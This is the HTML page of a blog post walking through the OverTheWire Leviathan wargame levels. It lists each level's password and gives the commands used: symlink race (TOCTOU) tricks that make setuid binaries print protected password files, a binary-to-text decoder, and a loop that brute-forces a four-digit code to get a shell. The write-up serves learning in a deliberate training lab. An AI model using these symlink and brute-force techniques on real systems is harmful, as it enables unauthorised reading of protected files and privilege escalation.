@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Leviathan :: My New Blog Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overthewire Leviathan Writeup" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://tariqbaater.github.io/posts/2024/leviathan/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/terminal.min.8337908176b2c35f2a702a4387a2773e672a3def4085970ab8e3c6c1410edea7.css">
+
+  
+  <link rel="stylesheet" href="https://tariqbaater.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="https://tariqbaater.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://tariqbaater.github.io/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:creator" content="tariqbaater" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Leviathan">
+<meta property="og:description" content="Overthewire Leviathan Writeup" />
+<meta property="og:url" content="https://tariqbaater.github.io/posts/2024/leviathan/" />
+<meta property="og:site_name" content="My New Blog Site" />
+
+  
+  
+  <meta property="og:image" content="https://tariqbaater.github.io/over-the-wire.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-12-23 06:17:50 &#43;0300 &#43;03" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Tariq Baater
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://tariqbaater.github.io/posts/2024/leviathan/">Leviathan</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-12-23</time><span class="post-author">Tariq Baater</span><span class="post-reading-time">3 min read (501 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://tariqbaater.github.io/tags/cybersecurity/">cybersecurity</a>&nbsp;
+      
+      #<a href="https://tariqbaater.github.io/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://tariqbaater.github.io/tags/overthewire/">overthewire</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="https://tariqbaater.github.io/over-the-wire.png"
+    class="post-cover"
+    alt="Leviathan"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="leviathan">Leviathan<a href="#leviathan" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="leviathan0">leviathan0<a href="#leviathan0" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan0<br>
+password: leviathan0<br>
+ssh port: 2223</p>
+<p>use grep to find the password.</p>
+<h2 id="leviathan1">leviathan1<a href="#leviathan1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan1<br>
+password: 3QJ3TgzHDq</p>
+<p>read the binary and trace with ltrace and strings.</p>
+<h2 id="leviathan2">leviathan2<a href="#leviathan2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan2<br>
+password: NsN1HwFoyN</p>
+<p>if you ltrace the the binary &lsquo;printfile&rsquo; you will see it&rsquo;s using access() function that is known for a vulnerability TOCTOU (Time-of-check to time-of-use) and was mostly abused using symlinks.</p>
+<p>Check the binary how it works</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ltrace -f ./printfile filename
+</span></span></code></pre></div><p>Since we found that access has a delay reading files, we can use that opportunity to read a filtered file.
+The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access.</p>
+<p>You&rsquo;ll need to run the commands on two separate screens, first we will chain multiple commands to symlink the target file to our tmp file in tmp then watch it run every 0.1 seconds.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>watch -n 0.1 touch /tmp/tmpfolder/lev3; ln -sf /etc/leviathan_pass/lev3 /tmp/tmpfolder/lev3; rm /tmp/tmpfolder/lev3
+</span></span></code></pre></div><p>On the second screen i will use a for loop to print the file 50 times hoping that i catch the delay loop hole before being restricted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..50<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>     ./printfile /tmp/sbin/lev3; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>After few loops the intended output will be printed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>f0n8h2iWLP
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span><span style="display:flex;"><span>You cant have that file...
+</span></span></code></pre></div><h2 id="leviathan3">leviathan3<a href="#leviathan3" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan3<br>
+password: f0n8h2iWLP</p>
+<p>read the binary &rsquo;level3&rsquo; and trace with ltrace and strings, there is a string comparison, same as as leviathan1.</p>
+<h2 id="leviathan4">leviathan4<a href="#leviathan4" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan4<br>
+password: WG1egElCvO</p>
+<p>There is a binary labelled &lsquo;bin&rsquo; in a hidden trash directory, if executed it prints out binary bytes. So i used the below script to decode the bytes to ascii text.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> binary in <span style="color:#e6db74">&#34;</span>$@<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;%03o&#39;</span> <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$((</span><span style="color:#ae81ff">2#</span>$binary<span style="color:#66d9ef">))</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>If you run the above script against the binary you will find your password for leviathan5.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x script.sh
+</span></span><span style="display:flex;"><span>./script <span style="color:#ae81ff">00110000</span> <span style="color:#ae81ff">01100100</span> <span style="color:#ae81ff">01111001</span> <span style="color:#ae81ff">01111000</span> <span style="color:#ae81ff">01010100</span> <span style="color:#ae81ff">00110111</span> <span style="color:#ae81ff">01000110</span> <span style="color:#ae81ff">00110100</span> <span style="color:#ae81ff">01010001</span> <span style="color:#ae81ff">01000100</span> <span style="color:#ae81ff">00001010</span>
+</span></span><span style="display:flex;"><span>0dyxT7F4QD
+</span></span></code></pre></div><h2 id="leviathan5">leviathan5<a href="#leviathan5" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan5<br>
+password: 0dyxT7F4QD</p>
+<p>This one is also fairly easy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If you echo foo into the file and run the leviathan5 binary, it will print out the file content.</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;foo&#34;</span> &gt; /tmp/file.log
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># output: foo</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># so all we have to do is to link the leviathan6 password file to /tmp/file.log</span>
+</span></span><span style="display:flex;"><span>ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and run the leviathan5 binary</span>
+</span></span><span style="display:flex;"><span>./leviathan5 /tmp/file.log
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># output: szo7HDB88w</span>
+</span></span></code></pre></div><h2 id="leviathan6">leviathan6<a href="#leviathan6" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan6<br>
+password: szo7HDB88w</p>
+<p>There is a binary that requires a 4 digit code, so i used the below script to generate the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..9999<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> ./leviathan6 $i; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Eventually one of the loop will crack the code and we get shell, just cat the next level password.</p>
+<h2 id="leviathan7">leviathan7<a href="#leviathan7" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>username: leviathan7<br>
+password: qEs5Io5yM8</p>
+<p>And that&rsquo;s it for now.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="https://tariqbaater.github.io/posts/2024/bandit/" class="button inline next">
+        Bandit
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+    <div class="footer__inner">
+        <div class="copyright copyright--user">
+            <span>© 2024 Tariq Baater. All rights reserved.</span>
+        </div>
+    </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+  
+</div>
+
+</body>
+</html>
